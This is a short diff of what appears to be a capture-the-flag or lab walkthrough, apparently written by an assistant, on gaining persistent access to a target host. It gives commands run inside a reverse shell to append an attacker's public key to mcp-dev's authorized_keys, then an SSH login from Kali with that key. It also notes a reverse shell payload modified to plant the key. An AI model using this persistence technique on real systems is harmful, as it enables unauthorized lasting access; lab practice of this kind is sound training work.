@@ -872,12 +872,21 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
-Copy that public key output, then back in the reverse shell run:
+Copy that public key output, then back in the reverse shell (on the target, as mcp-dev) run:
 mkdir -p /home/mcp-dev/.ssh
 echo 'PASTE_PUBLIC_KEY_HERE' >> /home/mcp-dev/.ssh/authorized_keys
 chmod 700 /home/mcp-dev/.ssh
 chmod 600 /home/mcp-dev/.ssh/authorized_keys
 
+
+3. Verify SSH works
+
+From Kali:
+ssh -i /tmp/devhub_key mcp-dev@10.129.245.216
+
+If that drops you into a clean shell as mcp-dev, you have stable persistent access and can let the reverse shell go.
+
+Run those steps and let me know what you get.
 
 The public key was injected into `/home/mcp-dev/.ssh/authorized_keys` by modifying the reverse shell payload to call `os.makedirs` and `open(...,'a').write(...)` before initiating the socket connection. Verification:
 
